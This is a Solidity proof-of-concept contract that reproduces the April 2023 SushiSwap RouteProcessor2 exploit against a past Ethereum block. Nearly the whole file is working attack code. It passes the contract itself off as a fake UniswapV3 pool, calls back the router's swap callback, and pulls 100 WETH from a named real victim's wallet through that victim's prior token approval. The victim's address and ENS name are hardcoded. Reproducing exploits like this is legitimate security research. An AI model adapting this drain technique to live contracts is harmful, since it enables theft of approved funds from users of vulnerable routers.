// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

/// @notice PoC for the SushiSwap RouteProcessor2 exploit (April 2023).
/// @dev Demonstrates that RP2 at block 17,007,841 allowed arbitrary pool addresses
///      in routes. A malicious "pool" receives a swap() callback from RP2, then
///      calls uniswapV3SwapCallback to trigger transferFrom on any user who
///      approved RP2.
///
///      Updated to reflect a real victim/amount from tx:
///      0xb8f57cf82b7057d9d03f1500e3f0ce46980388c3b13ff317f1c617d932313386
///      Block: 17,007,838
///      Victim: 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1 (sifuvision.eth)
///      Amount: 100 WETH
///
///      Attack flow:
///      1. Exploit calls processRoute with itself as the UniV3 "pool"
///      2. RP2 calls swap() on our contract (sets lastCalledPool = us)
///      3. In swap(), we call RP2.uniswapV3SwapCallback(amount, data)
///      4. RP2 checks msg.sender == lastCalledPool (passes!) and does
///         transferFrom(victim, pool, amount) using the victim's RP2 approval
///
///      Target block: 17,007,838 (pre-Shanghai, Ethereum Mainnet)
contract Exploit {
    address constant ROUTE_PROCESSOR = 0x044b75f554b886A065b9567891e45c79542d7357;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VICTIM = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    uint256 constant AMOUNT = 100 ether;

    bool private inCallback;

    function exploit() external {
        // --- Attack: craft a malicious route ---
        // Route encoding for RP2 (abi.encodePacked):
        //   uint8  commandCode  = 1  (processMyERC20)
        //   address token       = WETH
        //   uint8  numPools     = 1
        //   uint16 share        = 0
        //   uint8  poolType     = 1  (UniswapV3)
        //   address pool        = address(this)  <- MALICIOUS
        //   uint8  zeroForOne   = 0
        //   address recipient   = address(0)
        bytes memory route = abi.encodePacked(
            uint8(1),           // commandCode: processMyERC20
            WETH,               // token to process
            uint8(1),           // numPools
            uint16(0),          // share
            uint8(1),           // poolType: UniV3
            address(this),      // pool (our malicious contract)
            uint8(0),           // zeroForOne = false
            address(0)          // recipient
        );

        // Trigger the vulnerability.
        // Use WETH as tokenIn/tokenOut with amountIn=0 to avoid touching
        // sentinel addresses (0xEeee...) that cause proof verification issues.
        IRouteProcessor2(ROUTE_PROCESSOR).processRoute(
            WETH,                   // tokenIn (amountIn=0, so no transfer)
            0,                      // amountIn: 0
            WETH,                   // tokenOut
            0,                      // amountOutMin
            address(this),          // to
            route
        );
    }

    /// @dev RP2 calls IUniswapV3Pool(pool).swap(...) on us.
    ///      We call back uniswapV3SwapCallback to steal tokens.
    function swap(
        address,
        bool,
        int256,
        uint160,
        bytes calldata
    ) external returns (int256, int256) {
        if (!inCallback) {
            inCallback = true;

            // Encode the callback data: (tokenToSteal, victimAddress)
            // RP2's uniswapV3SwapCallback decodes this and calls
            // IERC20(token).safeTransferFrom(victim, msg.sender, amount)
            // Use a real victim who already approved RP2 at the target block.
            bytes memory data = abi.encode(WETH, VICTIM);

            // Call back into RP2 — it checks msg.sender == lastCalledPool (us), passes!
            IRouteProcessor2(ROUTE_PROCESSOR).uniswapV3SwapCallback(
                int256(AMOUNT),     // amount0Delta (amount to steal)
                int256(0),          // amount1Delta
                data
            );

            inCallback = false;
        }

        return (int256(AMOUNT), 0);
    }

    receive() external payable {}
}
